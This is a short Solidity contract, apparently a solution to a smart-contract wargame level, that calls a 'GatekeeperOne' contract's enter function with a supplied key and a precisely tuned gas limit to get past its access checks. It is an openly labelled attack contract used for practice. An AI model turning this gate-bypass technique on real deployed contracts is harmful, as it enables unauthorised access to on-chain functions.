// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "forge-std/console.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneHack {
    address gatekeeperOne;

    constructor(address gatekeeperOne_) {
        gatekeeperOne = gatekeeperOne_;
    }

    function attack(bytes8 key) public {
        IGatekeeperOne(gatekeeperOne).enter{gas: 57608}(key);
    }
}
